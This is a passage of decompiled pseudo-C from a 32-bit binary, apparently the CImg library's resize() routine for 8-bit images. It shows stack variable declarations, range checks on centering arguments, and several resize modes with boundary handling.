  double v627; // xmm6_8
  double v628; // xmm0_8
  double v629; // xmm2_8
  double v630; // xmm1_8
  double v631; // xmm3_8
  double v632; // xmm0_8
  double v633; // xmm1_8
  double v634; // xmm0_8
  size_t v635; // ecx
  unsigned int v636; // eax
  int v637; // eax
  double v638; // xmm1_8
  unsigned int v639; // eax
  __m128i v640; // xmm0
  double v641; // xmm1_8
  size_t v642; // edi
  double v643; // xmm2_8
  double *v644; // ecx
  unsigned int v645; // eax
  unsigned int v646; // esi
  size_t v647; // edx
  int v648; // edx
  int v649; // ecx
  int v650; // eax
  int v651; // esi
  int v652; // edx
  int v653; // eax
  int v654; // ebx
  unsigned __int8 *v655; // esi
  size_t v656; // ebx
  double *v657; // eax
  double v658; // xmm6_8
  double v659; // xmm0_8
  double v660; // xmm2_8
  double v661; // xmm1_8
  double v662; // xmm3_8
  double v663; // xmm0_8
  double v664; // xmm1_8
  double v665; // xmm0_8
  size_t v666; // ecx
  _DWORD *v667; // eax
  int v668; // ebx
  _DWORD *v669; // eax
  int v670; // ebx
  _DWORD *v671; // eax
  int v672; // ebx
  _DWORD *v673; // eax
  unsigned int v674; // ebx
  int v675; // ebx
  __int64 v676; // [esp+18h] [ebp-218h]
  __int64 v677; // [esp+18h] [ebp-218h]
  __int64 v678; // [esp+18h] [ebp-218h]
  __int64 v679; // [esp+18h] [ebp-218h]
  __int64 v680; // [esp+18h] [ebp-218h]
  __int64 v681; // [esp+18h] [ebp-218h]
  int v682; // [esp+1Ch] [ebp-214h]
  void *v683[6]; // [esp+30h] [ebp-200h] BYREF
  void *v684[6]; // [esp+48h] [ebp-1E8h] BYREF
  void *v685[6]; // [esp+60h] [ebp-1D0h] BYREF
  void *v686[6]; // [esp+78h] [ebp-1B8h] BYREF
  void *v687[6]; // [esp+90h] [ebp-1A0h] BYREF
  double v688; // [esp+A8h] [ebp-188h]
  size_t v689[2]; // [esp+B0h] [ebp-180h] BYREF
  void *v690[6]; // [esp+B8h] [ebp-178h] BYREF
  _BYTE *v691; // [esp+D0h] [ebp-160h]
  double v692; // [esp+D4h] [ebp-15Ch]
  double v693; // [esp+DCh] [ebp-154h]
  double v694; // [esp+E4h] [ebp-14Ch]
  int v695; // [esp+ECh] [ebp-144h]
  int v696; // [esp+F0h] [ebp-140h]
  void *v697[2]; // [esp+F4h] [ebp-13Ch] BYREF
  char v698[8]; // [esp+FCh] [ebp-134h] BYREF
  double v699; // [esp+104h] [ebp-12Ch]
  int v700; // [esp+10Ch] [ebp-124h]
  unsigned int v701; // [esp+110h] [ebp-120h]
  double v702; // [esp+114h] [ebp-11Ch]
  unsigned int *v703; // [esp+11Ch] [ebp-114h]
  unsigned int v704; // [esp+120h] [ebp-110h] BYREF
  int v705; // [esp+124h] [ebp-10Ch]
  unsigned __int8 v706; // [esp+12Bh] [ebp-105h] BYREF
  size_t Size; // [esp+12Ch] [ebp-104h]
  int v708; // [esp+130h] [ebp-100h]
  void *v709[5]; // [esp+134h] [ebp-FCh] BYREF
  size_t v710; // [esp+148h] [ebp-E8h]
  void *v711[4]; // [esp+14Ch] [ebp-E4h] BYREF
  char v712; // [esp+15Ch] [ebp-D4h]
  void *Block; // [esp+160h] [ebp-D0h]
  int v714; // [esp+164h] [ebp-CCh] BYREF
  int v715; // [esp+168h] [ebp-C8h]
  int v716; // [esp+16Ch] [ebp-C4h]
  int v717; // [esp+170h] [ebp-C0h]
  char v718; // [esp+174h] [ebp-BCh]
  void *v719; // [esp+178h] [ebp-B8h]
  int v720; // [esp+17Ch] [ebp-B4h] BYREF
  int v721; // [esp+180h] [ebp-B0h]
  int v722; // [esp+184h] [ebp-ACh]
  int v723; // [esp+188h] [ebp-A8h]
  char v724; // [esp+18Ch] [ebp-A4h]
  size_t v725; // [esp+190h] [ebp-A0h]
  unsigned int v726; // [esp+194h] [ebp-9Ch] BYREF
  int v727; // [esp+198h] [ebp-98h] BYREF
  int v728; // [esp+19Ch] [ebp-94h]
  int v729; // [esp+1A0h] [ebp-90h]
  int v730; // [esp+1A4h] [ebp-8Ch]
  char v731; // [esp+1A8h] [ebp-88h]
  size_t v732; // [esp+1ACh] [ebp-84h]
  unsigned int v733; // [esp+1B0h] [ebp-80h] BYREF
  unsigned int v734; // [esp+1B4h] [ebp-7Ch] BYREF
  size_t v735; // [esp+1B8h] [ebp-78h] BYREF
  int v736; // [esp+1BCh] [ebp-74h] BYREF
  int v737; // [esp+1C0h] [ebp-70h]
  int v738; // [esp+1C4h] [ebp-6Ch]
  int v739; // [esp+1C8h] [ebp-68h]
  char v740; // [esp+1CCh] [ebp-64h]
  int v741; // [esp+1D4h] [ebp-5Ch] BYREF
  int v742; // [esp+1D8h] [ebp-58h]
  int v743; // [esp+1DCh] [ebp-54h]
  int v744; // [esp+1E0h] [ebp-50h]
  char v745; // [esp+1E4h] [ebp-4Ch]
  int v746; // [esp+1ECh] [ebp-44h] BYREF
  int v747; // [esp+1F0h] [ebp-40h]
  int pExceptionObject; // [esp+1F4h] [ebp-3Ch] BYREF
  int v749; // [esp+1F8h] [ebp-38h]
  double v750; // [esp+1FCh] [ebp-34h] BYREF
  int v751; // [esp+204h] [ebp-2Ch] BYREF
  double v752; // [esp+208h] [ebp-28h] BYREF
  double v753; // [esp+210h] [ebp-20h] BYREF
  unsigned int v754; // [esp+218h] [ebp-18h] BYREF
  int v755; // [esp+21Ch] [ebp-14h] BYREF
  int v756; // [esp+22Ch] [ebp-4h]

  v12 = this;
  v703 = (unsigned int *)this;
  v704 = a2;
  v701 = 0;
  v691 = (_BYTE *)a2;
  v700 = 0;
  v689[1] = 0;
  if ( a9 < 0.0 || a9 > 1.0 || a10 < 0.0 || a10 > 1.0 || a11 < 0.0 || a11 > 1.0 || a12 < 0.0 || a12 > 1.0 )
  {
    sub_41C6D0();
    sub_41C2D0(
      (int)&pExceptionObject,
      (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::resize(): Specified centering arguments (%g,%g,%g,%g) are outside range [0,1].",
      *v12);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
  }
  v13 = a3;
  if ( !a3 || (v14 = a4) == 0 || !a5 || !a6 )
  {
    *(_DWORD *)a2 = 0;
    *(_DWORD *)(a2 + 4) = 0;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_BYTE *)(a2 + 16) = 0;
    *(_DWORD *)(a2 + 20) = 0;
    return (_BYTE *)a2;
  }
  if ( a3 < 0 )
  {
    v14 = a4;
    v13 = a3 * *v12 / -100;
  }
  v15 = 1;
  v16 = 1;
  if ( v13 > 1 )
    v16 = v13;
  v735 = v16;
  if ( v14 < 0 )
  {
    v15 = 1;
    v14 = a4 * v12[1] / -100;
  }
  v17 = a5;
  v18 = 1;
  if ( (unsigned int)v14 > 1 )
    v18 = v14;
  HIDWORD(v752) = v18;
  v734 = v18;
  if ( a5 < 0 )
  {
    v15 = 1;
    v17 = a5 * v12[2] / -100;
  }
  v19 = 1;
  if ( v17 > 1 )
    v19 = v17;
  v20 = a6;
  HIDWORD(v702) = v19;
  v733 = v19;
  if ( a6 < 0 )
  {
    v19 = HIDWORD(v702);
    v15 = 1;
    v20 = a6 * v12[3] / -100;
  }
  if ( v20 > 1 )
    v15 = v20;
  v21 = *v12;
  v754 = v15;
  v726 = v15;
  if ( v16 == v21 && v18 == v12[1] && v19 == v12[2] && v15 == v12[3] )
  {
    sub_42A7F0(v691, (int)v12, 0);
    return v691;
  }
  if ( !v12[5] || !v21 || (Size = v12[1]) == 0 || !v12[2] || (v23 = v12[3]) == 0 )
  {
    v706 = 0;
    sub_422F00(v691, v16, v18, v19, v15, &v706);
    return v691;
  }
  v714 = 0;
  v715 = 0;
  v716 = 0;
  v717 = 0;
  v718 = 0;
  v719 = 0;
  v756 = 0;
  HIDWORD(v753) = a7 + 1;
  v24 = HIDWORD(v702);
  switch ( a7 )
  {
    case -1:
      v25 = *v12 * v12[1] * v12[2] * v23;
      v706 = 0;
      v26 = v16 * HIDWORD(v752) * HIDWORD(v702) * v754;
      Size = v25;
      v27 = (int *)sub_42A620((int)&v714, v16, SHIDWORD(v752), SHIDWORD(v702), v754);
      v28 = sub_423080(v27, &v706);
      if ( v26 >= Size )
        v26 = Size;
      memmove((void *)v28[5], (const void *)v12[5], v26);
      goto LABEL_347;
    case 0:
      v755 = (int)(float)((float)(int)(v16 - *v12) * a9);
      v695 = (int)(float)((float)(v18 - v12[1]) * a10);
      v696 = (int)(float)((float)(HIDWORD(v702) - v12[2]) * a11);
      v751 = (int)(float)((float)(int)(v754 - v23) * a12);
      switch ( a8 )
      {
        case 1:
          v61 = (signed int *)sub_42A620((int)&v714, v16, v18, SHIDWORD(v702), v754);
          v62 = v751;
          v63 = v755;
          sub_42A950(v61, v755, v695, v696, v751, v12, 1.0);
          v727 = 0;
          v728 = 0;
          v729 = 0;
          v730 = 0;
          v731 = 0;
          v732 = 0;
          LOBYTE(v756) = 1;
          if ( v63 > 0 )
          {
            v676 = (unsigned int)(v12[3] + v62 - 1);
            v64 = sub_42AF90(
                    &v714,
                    v711,
                    v63,
                    v695,
                    v696,
                    v62,
                    v63,
                    v695 - 1 + v12[1],
                    v12[2] + v696 - 1,
                    v676,
                    SHIDWORD(v676));
            LOBYTE(v756) = 2;
            sub_423F60((int)v64, (int)&v727);
            v12 = (int *)v703;
            LOBYTE(v756) = 1;
            if ( !v712 )
              j_j__free(Block);
            v65 = v63 - 1;
            if ( v65 >= 0 )
            {
              do
                sub_42A950(&v714, v65--, v695, v696, v62, &v727, 1.0);
              while ( v65 >= 0 );
              v12 = (int *)v703;
            }
            v63 = v755;
          }
          v66 = v63 + *v12;
          if ( v66 < (int)v735 )
          {
            v677 = (unsigned int)(v12[3] + v62 - 1);
            v67 = sub_42AF90(
                    &v714,
                    v711,
                    v66 - 1,
                    v695,
                    v696,
                    v62,
                    v66 - 1,
                    v695 - 1 + v12[1],
                    v12[2] + v696 - 1,
                    v677,
                    SHIDWORD(v677));
            LOBYTE(v756) = 3;
            sub_423F60((int)v67, (int)&v727);
            v12 = (int *)v703;
            LOBYTE(v756) = 1;
            if ( !v712 )
              j_j__free(Block);
            v68 = v755 + *v703;
            if ( v68 < (int)v735 )
            {
              do
                sub_42A950(&v714, v68++, v695, v696, v62, &v727, 1.0);
              while ( v68 < (int)v735 );
              v12 = (int *)v703;
            }
          }
          if ( v695 > 0 )
          {
            v678 = (unsigned int)(v12[3] + v62 - 1);
            v69 = sub_42AF90(&v714, v711, 0, v695, v696, v62, v735 - 1, v695, v12[2] + v696 - 1, v678, SHIDWORD(v678));
            LOBYTE(v756) = 4;
            sub_423F60((int)v69, (int)&v727);
            LOBYTE(v756) = 1;
            if ( !v712 )
              j_j__free(Block);
            v70 = v695 - 1;
            if ( v695 - 1 >= 0 )
            {
              do
                sub_42A950(&v714, 0, v70--, v696, v62, &v727, 1.0);
              while ( v70 >= 0 );
              v12 = (int *)v703;
            }
          }
          v71 = v695 + v12[1];
          if ( v71 < (int)v734 )
          {
            v679 = (unsigned int)(v12[3] + v62 - 1);
            v72 = sub_42AF90(
                    &v714,
                    v711,
                    0,
                    v71 - 1,
                    v696,
                    v62,
                    v735 - 1,
                    v71 - 1,
                    v12[2] + v696 - 1,
                    v679,
                    SHIDWORD(v679));
            LOBYTE(v756) = 5;
            sub_423F60((int)v72, (int)&v727);
            LOBYTE(v756) = 1;
            if ( !v712 )
              j_j__free(Block);
            v73 = v695 + v12[1];
            if ( v73 < (int)v734 )
            {
              do
                sub_42A950(&v714, 0, v73++, v696, v62, &v727, 1.0);
              while ( v73 < (int)v734 );
              v12 = (int *)v703;
            }
          }
          v74 = v696;
          if ( v696 > 0 )
          {
            v680 = (unsigned int)(v12[3] + v62 - 1);
            v75 = sub_42AF90(&v714, v711, 0, 0, v696, v62, v735 - 1, v734 - 1, v696, v680, SHIDWORD(v680));
            LOBYTE(v756) = 6;
            sub_423F60((int)v75, (int)&v727);
            LOBYTE(v756) = 1;
            if ( !v712 )
              j_j__free(Block);
            for ( i = v696 - 1; i >= 0; --i )
              sub_42A950(&v714, 0, 0, i, v62, &v727, 1.0);
            v74 = v696;
          }
          v77 = v12[2] + v74;
          j = v733;
          if ( v77 < (int)v733 )
          {
            v681 = (unsigned int)(v12[3] + v62 - 1);
            v79 = sub_42AF90(&v714, v711, 0, 0, v77 - 1, v62, v735 - 1, v734 - 1, v77 - 1, v681, SHIDWORD(v681));
            LOBYTE(v756) = 7;
            sub_423F60((int)v79, (int)&v727);
            LOBYTE(v756) = 1;
            if ( !v712 )
              j_j__free(Block);
            v80 = v696 + v12[2];
            for ( j = v733; v80 < (int)v733; ++v80 )
            {
              sub_42A950(&v714, 0, 0, v80, v62, &v727, 1.0);
              j = v733;
            }
          }
          if ( v62 > 0 )
          {
            v81 = sub_42AF90(&v714, v711, 0, 0, 0, v62, v735 - 1, v734 - 1, j - 1, v62, 0);
            LOBYTE(v756) = 8;
            sub_423F60((int)v81, (int)&v727);
            LOBYTE(v756) = 1;
            if ( !v712 )
              j_j__free(Block);
            for ( k = v62 - 1; k >= 0; --k )
              sub_42A950(&v714, 0, 0, 0, k, &v727, 1.0);
          }
          v83 = sub_41C280(v12);
          if ( v62 + v83 < (int)v726 )
          {
            v84 = v62 - 1 + sub_41C280(v703);
            v85 = v734 - 1;
            v86 = v733 - 1;
            v87 = v735 - 1;
            v704 = v84;
            v88 = sub_41C280(v703);
            v89 = sub_42AF90(&v714, v711, 0, 0, 0, v751 - 1 + v88, v87, v85, v86, v704, 0);
            LOBYTE(v756) = 9;
            sub_423F60((int)v89, (int)&v727);
            LOBYTE(v756) = 1;
            sub_421DE0(v711);
            v90 = sub_41C280(v703);
            for ( m = v751 + v90; m < (int)v726; ++m )
              sub_42A950(&v714, 0, 0, 0, m, &v727, 1.0);
          }
          LOBYTE(v756) = 0;
          sub_421DE0((void **)&v727);
          break;
        case 2:
          sub_42A620((int)&v714, v16, v18, SHIDWORD(v702), v754);
          v50 = v755 % *v12 - *v12;
          v704 = *v12;
          v51 = v12[1];
          HIDWORD(v753) = v50;
          HIDWORD(v699) = v51;
          v52 = v695 % v51 - v51;
          v53 = v696 % v12[2] - v12[2];
          HIDWORD(v750) = v12[2];
          v54 = v12[3];
          Size = v53;
          v700 = v52;
          v55 = v751 % v54 - v54;
          HIDWORD(v752) = v54;
          HIDWORD(v693) = v55;
          if ( v55 < (int)v726 )
          {
            v56 = v735;
            v57 = v733;
            do
            {
              v58 = Size;
              HIDWORD(v702) = Size;
              if ( (int)Size < v57 )
              {
                v59 = v734;
                do
                {
                  if ( v700 < v59 )
                  {
                    do
                    {
                      v60 = HIDWORD(v753);
                      if ( SHIDWORD(v753) < v56 )
                      {
                        do
                        {
                          sub_42A950(&v714, v60, v52, v58, v55, v12, 1.0);
                          v60 += v704;
                          v56 = v735;
                          v58 = HIDWORD(v702);
                          v55 = HIDWORD(v693);
                        }
                        while ( v60 < (int)v735 );
                      }
                      v52 += HIDWORD(v699);
                      v59 = v734;
                    }
                    while ( v52 < (int)v734 );
                  }
                  v58 += HIDWORD(v750);
                  v52 = v700;
                  HIDWORD(v702) = v58;
                }
                while ( v58 < (int)v733 );
                v57 = v733;
              }
              v55 += HIDWORD(v752);
              HIDWORD(v693) = v55;
            }
            while ( v55 < (int)v726 );
          }
          break;
        case 3:
          sub_42A620((int)&v714, v16, v18, SHIDWORD(v702), v754);
          v30 = v12[1];
          v31 = 2 * *v12;
          HIDWORD(v693) = 2 * v12[2];
          v32 = 2 * v30;
          v33 = 2 * v12[3];
          v754 = v31;
          HIDWORD(v692) = v33;
          v34 = v717;
          v700 = v32;
          v708 = 0;
          if ( v717 > 0 )
          {
            v35 = v715;
            v36 = -v751;
            v751 = -v751;
            do
            {
              HIDWORD(v694) = 0;
              if ( v716 > 0 )
              {
                v37 = HIDWORD(v694);
                v38 = -v696;
                v705 = -v696;
                do
                {
                  HIDWORD(v688) = 0;
                  if ( v35 > 0 )
                  {
                    v39 = v714;
                    v40 = -v695;
                    HIDWORD(v702) = -v695;
                    do
                    {
                      HIDWORD(v753) = 0;
                      if ( v39 > 0 )
                      {
                        v41 = v40 % v32;
                        v689[1] = v705 % SHIDWORD(v693);
                        v42 = -v755;
                        v704 = v41;
                        HIDWORD(v752) = v751 % SHIDWORD(v692);
                        Size = -v755;
                        while ( 1 )
                        {
                          v43 = v42 % v31;
                          if ( v42 < 0 )
                          {
                            if ( v43 )
                              v43 += v754;
                            else
                              v43 = 0;
                          }
                          if ( v702 < 0.0 )
                          {
                            if ( v41 )
                              v41 += v700;
                            else
                              v41 = 0;
                          }
                          if ( v705 < 0 )
                          {
                            if ( v689[1] )
                              v44 = v689[1] + HIDWORD(v693);
                            else
                              v44 = 0;
                          }
                          else
                          {
                            v44 = v689[1];
                          }
                          if ( v751 < 0 )
                          {
                            if ( HIDWORD(v752) )
                              v45 = HIDWORD(v752) + HIDWORD(v692);
                            else
                              v45 = 0;
                          }
                          else
                          {
                            v45 = HIDWORD(v752);
                          }
                          if ( v45 >= v12[3] )
                            v45 = HIDWORD(v692) - v45 - 1;
                          HIDWORD(v750) = v12[2];
                          if ( v44 >= SHIDWORD(v750) )
                            v44 = HIDWORD(v693) - v44 - 1;
                          HIDWORD(v699) = v12[1];
                          if ( v41 >= SHIDWORD(v699) )
                            v41 = v700 - v41 - 1;
                          v46 = *v12;
                          if ( v43 >= v46 )
                            v43 = v754 - v43 - 1;
                          v47 = v46 * (v41 + HIDWORD(v699) * (v44 + HIDWORD(v750) * v45));
                          v12 = (int *)v703;
                          v48 = *(_BYTE *)(v703[5] + v47 + v43);
                          v49 = HIDWORD(v753);
                          v31 = v754;
                          *((_BYTE *)v719 + v714 * (HIDWORD(v688) + v715 * (HIDWORD(v694) + v708 * v716))
                                          + HIDWORD(v753)) = v48;
                          v39 = v714;
                          v42 = Size + 1;
                          HIDWORD(v753) = v49 + 1;
                          ++Size;
                          if ( v49 + 1 >= v714 )
                            break;
                          v41 = v704;
                        }
                        v35 = v715;
                        v32 = v700;
                        v40 = HIDWORD(v702);
                      }
                      ++HIDWORD(v688);
                      HIDWORD(v702) = ++v40;
                    }
                    while ( SHIDWORD(v688) < v35 );
                    v38 = v705;
                    v37 = HIDWORD(v694);
                  }
                  ++v37;
                  ++v38;
                  HIDWORD(v694) = v37;
                  v705 = v38;
                }
                while ( v37 < v716 );
                v34 = v717;
                v36 = v751;
              }
              ++v708;
              v751 = ++v36;
            }
            while ( v708 < v34 );
          }
          break;
        default:
          v706 = 0;
          v29 = sub_42A5C0(&v714, v16, v18, SHIDWORD(v702), v754, &v706);
          sub_42A950(v29, v755, v695, v696, v751, v12, 1.0);
          break;
      }
      goto LABEL_347;
    case 1:
      sub_42A620((int)&v714, v16, v18, SHIDWORD(v702), v754);
      sub_421DF0(&v727, v735, 1, 1, 1);
      LOBYTE(v756) = 10;
      sub_421DF0(&v720, v734 + 1, 1, 1, 1);
      LOBYTE(v756) = 11;
      sub_421DF0(v709, v733 + 1, 1, 1, 1);
      LOBYTE(v756) = 12;
      sub_421DF0(v711, v726 + 1, 1, 1, 1);
      LOBYTE(v756) = 13;
      v92 = *v12;
      v93 = v734;
      HIDWORD(v753) = v12[1] * *v12;
      HIDWORD(v752) = v12[1] * v92 * v12[2];
      v689[1] = v735 * v734;
      HIDWORD(v694) = v735 * v734 * v733;
      if ( v735 == v92 )
      {
        v704 = 1;
        sub_4234B0(&v727, (int *)&v704);
      }
      else
      {
        v94 = 0;
        v95 = 0;
        Size = v732;
        if ( v714 <= 0 )
          goto LABEL_153;
        do
        {
          ++v95;
          v96 = v94;
          v94 = v95 * *v12 / v735;
          v97 = Size;
          *(_DWORD *)Size = v94 - v96;
          Size = v97 + 4;
        }
        while ( v95 < v714 );
      }
      v93 = v734;
LABEL_153:
      if ( v93 == v12[1] )
      {
        sub_4234B0(&v720, v12);
      }
      else
      {
        v98 = (_DWORD *)v725;
        v99 = 0;
        v100 = 0;
        Size = v725;
        if ( v715 > 0 )
        {
          while ( 1 )
          {
            ++v100;
            v101 = v99;
            v99 = v100 * v12[1] / v93;
            v102 = Size;
            *(_DWORD *)Size = *v12 * (v99 - v101);
            v98 = (_DWORD *)(v102 + 4);
            Size = (size_t)v98;
            if ( v100 >= v715 )
              break;
            v93 = v734;
          }
        }
        *v98 = 0;
      }
      v103 = v733;
      if ( v733 == v12[2] )
      {
        sub_4234B0(v709, (int *)&v753 + 1);
      }
      else
      {
        v104 = (_DWORD *)v710;
        v105 = 0;
        v106 = 0;
        Size = v710;
        if ( v716 > 0 )
        {
          while ( 1 )
          {
            ++v106;
            v107 = v105;
            v105 = v106 * v12[2] / v103;
            v108 = Size;
            *(_DWORD *)Size = HIDWORD(v753) * (v105 - v107);
            v104 = (_DWORD *)(v108 + 4);
            Size = (size_t)v104;
            if ( v106 >= v716 )
              break;
            v103 = v733;
          }
        }
        *v104 = 0;
      }
      v109 = v726;
      if ( v726 == v12[3] )
      {
        sub_4234B0(v711, (int *)&v752 + 1);
      }
      else
      {
        v110 = Block;
        v111 = 0;
        v112 = 0;
        Size = (size_t)Block;
        if ( v717 > 0 )
        {
          while ( 1 )
          {
            ++v112;
            v113 = v111;
            v111 = v112 * v12[3] / v109;
            v114 = Size;
            *(_DWORD *)Size = HIDWORD(v752) * (v111 - v113);
            v110 = (_DWORD *)(v114 + 4);
            Size = (size_t)v110;
            if ( v112 >= v717 )
              break;
            v109 = v726;
          }
        }
        *v110 = 0;
      }
      v115 = v12[5];
      v116 = 0;
      v117 = (unsigned int *)Block;
      v118 = v719;
      Size = v115;
      v755 = (int)Block;
      v705 = 0;
      if ( v726 )
      {
        v119 = v735;
        do
        {
          v120 = v115;
          v121 = (unsigned int *)v710;
          HIDWORD(v692) = v120;
          v708 = v710;
          HIDWORD(v693) = 0;
          if ( v733 )
          {
            do
            {
              v122 = (unsigned int *)v725;
              v123 = 0;
              v700 = v120;
              HIDWORD(v702) = v725;
              if ( v734 )
              {
                do
                {
                  v124 = (_BYTE *)v120;
                  HIDWORD(v699) = 0;
                  if ( v714 > 0 )
                  {
                    v125 = HIDWORD(v699);
                    v126 = v732;
                    do
                    {
                      v126 += 4;
                      *v118 = *v124;
                      ++v125;
                      ++v118;
                      v124 += *(_DWORD *)(v126 - 4);
                    }
                    while ( v125 < v714 );
                    v119 = v735;
                    v122 = (unsigned int *)HIDWORD(v702);
                  }
                  v127 = *v122;
                  ++v123;
                  HIDWORD(v702) = ++v122;
                  if ( !v127 )
                  {
                    do
                    {
                      if ( v123 >= v127 )
                        break;
                      memmove(v118, &v118[-v119], v119);
                      v127 = *v122;
                      v119 = v735;
                      ++v123;
                      v118 += v735;
                      ++v122;
                    }
                    while ( !v127 );
                    HIDWORD(v702) = v122;
                  }
                  v700 += v127;
                  v120 = v700;
                }
                while ( v123 < v734 );
                v121 = (unsigned int *)v708;
              }
              v128 = *v121;
              v129 = HIDWORD(v693) + 1;
              ++v121;
              ++HIDWORD(v693);
              v708 = (int)v121;
              if ( !v128 )
              {
                v130 = v689[1];
                v131 = &v118[-v689[1]];
                do
                {
                  if ( v129 >= v128 )
                    break;
                  memmove(v118, v131, v130);
                  v130 = v689[1];
                  ++v129;
                  v118 += v689[1];
                  v131 += v689[1];
                  v128 = *(_DWORD *)v708;
                  v121 = (unsigned int *)(v708 + 4);
                  v708 += 4;
                }
                while ( !v128 );
                v119 = v735;
                HIDWORD(v693) = v129;
              }
              HIDWORD(v692) += v128;
              v120 = HIDWORD(v692);
            }
            while ( v129 < v733 );
            v116 = v705;
            v117 = (unsigned int *)v755;
          }
          v132 = *v117;
          ++v116;
          ++v117;
          v705 = v116;
          v755 = (int)v117;
          if ( !v132 )
          {
            v133 = HIDWORD(v694);
            v134 = &v118[-HIDWORD(v694)];
            do
            {
              if ( v116 >= v132 )
                break;
              memmove(v118, v134, v133);
              v133 = HIDWORD(v694);
              ++v116;
              v118 += HIDWORD(v694);
              v134 += HIDWORD(v694);
              v132 = *(_DWORD *)v755;
              v755 += 4;
            }
            while ( !v132 );
            v119 = v735;
            v117 = (unsigned int *)v755;
            v705 = v116;
          }
          v115 = v132 + Size;
          Size += v132;
        }
        while ( v116 < v726 );
      }
      sub_421DE0(v711);
      sub_421DE0(v709);
      sub_421DE0((void **)&v720);
      LOBYTE(v756) = 0;
      sub_421DE0((void **)&v727);
      goto LABEL_347;
    case 2:
      v706 = 1;
      if ( v16 != *v12 )
      {
        v704 = 0;
        sub_423A60(&v720, v16, v12[1], v12[2], v23, (float *)&v704);
        LOBYTE(v756) = 14;
        v135 = 0;
        v136 = v735 * *v12;
        v754 = *v12;
        v751 = v735;
        HIDWORD(v702) = 0;
        v755 = 0;
        if ( v136 )
        {
          do
          {
            v137 = sub_423490(&v754, &v751);
            v138 = v722;
            v139 = 0;
            v140 = *v137;
            v141 = v136 - *v137;
            v754 -= *v137;
            v751 -= v140;
            v142 = v721;
            HIDWORD(v753) = v141;
            v143 = v723;
            Size = v140;
            if ( v723 > 0 )
            {
              do
              {
                for ( n = 0; n < v138; ++n )
                {
                  v145 = 0;
                  if ( v142 > 0 )
                  {
                    *((float *)&v699 + 1) = (float)v140;
                    do
                    {
                      *((float *)&v750 + 1) = (float)*(unsigned __int8 *)sub_422930(v703, SHIDWORD(v702), v145, n, v139)
                                            * *((float *)&v699 + 1);
                      v146 = (float *)sub_423A30(&v720, v755, v145++, n, v139);
                      *v146 = *((float *)&v750 + 1) + *v146;
                      v142 = v721;
                    }
                    while ( v145 < v721 );
                    v138 = v722;
                    v140 = Size;
                  }
                }
                v143 = v723;
                ++v139;
              }
              while ( v139 < v723 );
              v135 = v755;
            }
            if ( v754 )
            {
              v12 = (int *)v703;
            }
            else
            {
              v147 = 0;
              if ( v143 > 0 )
              {
                v148 = v723;
                do
                {
                  v149 = 0;
                  if ( v138 > 0 )
                  {
                    do
                    {
                      v150 = 0;
                      if ( v142 > 0 )
                      {
                        do
                        {
                          *((float *)&v699 + 1) = (float)*v703;
                          v151 = (float *)sub_423A30(&v720, v755, v150++, v149, v147);
                          *v151 = *v151 / *((float *)&v699 + 1);
                          v142 = v721;
                        }
                        while ( v150 < v721 );
                        v138 = v722;
                      }
                      ++v149;
                    }
                    while ( v149 < v138 );
                    v148 = v723;
                  }
                  ++v147;
                }
                while ( v147 < v148 );
                v135 = v755;
              }
              v12 = (int *)v703;
              v755 = ++v135;
              v754 = *v703;
            }
            if ( !v751 )
            {
              ++HIDWORD(v702);
              v751 = v735;
            }
            v136 = HIDWORD(v753);
          }
          while ( HIDWORD(v753) );
        }
        sub_42BBF0(&v720, (int)&v714);
        v706 = 0;
        LOBYTE(v756) = 0;
        sub_421DE0((void **)&v720);
        v23 = v12[3];
        v16 = v735;
        v18 = v734;
        v24 = v733;
        Size = v12[1];
      }
      v152 = v12[2];
      if ( v18 == Size )
        goto LABEL_267;
      v704 = 0;
      sub_423A60(&v727, v16, v18, v152, v23, (float *)&v704);
      LOBYTE(v756) = 15;
      v153 = v12[1];
      v154 = 0;
      v155 = v734 * v153;
      v755 = v153;
      v754 = v734;
      v705 = 0;
      if ( !(v734 * v153) )
        goto LABEL_266;
      while ( 1 )
      {
        v156 = sub_423490(&v755, &v754);
        v157 = 0;
        v708 = 0;
        v158 = *v156;
        v755 -= v158;
        v754 -= v158;
        HIDWORD(v753) = v155 - v158;
        v159 = v730;
        Size = v158;
        if ( v706 )
        {
          if ( v730 > 0 )
          {
            v160 = v729;
            v161 = v727;
            do
            {
              v162 = 0;
              if ( v160 > 0 )
              {
                do
                {
                  v163 = 0;
                  if ( v161 > 0 )
                  {
                    *((float *)&v699 + 1) = (float)Size;
                    do
                    {
                      *((float *)&v750 + 1) = (float)*(unsigned __int8 *)sub_422930(v703, v163, v705, v162, v157)
                                            * *((float *)&v699 + 1);
                      v164 = (float *)sub_423A30(&v727, v163++, v154, v162, v708);
                      v157 = v708;
                      *v164 = *((float *)&v750 + 1) + *v164;
                      v161 = v727;
                    }
                    while ( v163 < v727 );
                    v160 = v729;
                  }
                  ++v162;
                }
                while ( v162 < v160 );
                v159 = v730;
              }
              v708 = ++v157;
            }
            while ( v157 < v159 );
            goto LABEL_253;
          }
        }
        else if ( v730 > 0 )
        {
          v160 = v729;
          v161 = v727;
          do
          {
            v165 = 0;
            if ( v160 > 0 )
            {
              do
              {
                v166 = 0;
                if ( v161 > 0 )
                {
                  *((float *)&v699 + 1) = (float)Size;
                  do
                  {
                    *((float *)&v750 + 1) = (float)*(unsigned __int8 *)sub_422930(&v714, v166, v705, v165, v157)
                                          * *((float *)&v699 + 1);
                    v167 = (float *)sub_423A30(&v727, v166++, v154, v165, v708);
                    v157 = v708;
                    *v167 = *((float *)&v750 + 1) + *v167;
                    v161 = v727;
                  }
                  while ( v166 < v727 );
                  v160 = v729;
                }
                ++v165;
              }
              while ( v165 < v160 );
              v159 = v730;
            }
            v708 = ++v157;
          }
          while ( v157 < v159 );
          goto LABEL_253;
        }
        v160 = v729;
        v161 = v727;
LABEL_253:
        if ( !v755 )
        {
          v168 = 0;
          for ( HIDWORD(v702) = 0; v168 < v159; HIDWORD(v702) = v168 )
          {
            v169 = 0;
            if ( v160 > 0 )
            {
              do
              {
                v170 = 0;
                if ( v161 > 0 )
                {
                  do
                  {
                    *((float *)&v699 + 1) = (float)v703[1];
                    v171 = (float *)sub_423A30(&v727, v170, v154, v169, v168);
                    v168 = HIDWORD(v702);
                    ++v170;
                    *v171 = *v171 / *((float *)&v699 + 1);
                    v161 = v727;
                  }
                  while ( v170 < v727 );
                  v160 = v729;
                }
                ++v169;
              }
              while ( v169 < v160 );
              v159 = v730;
            }
            ++v168;
          }
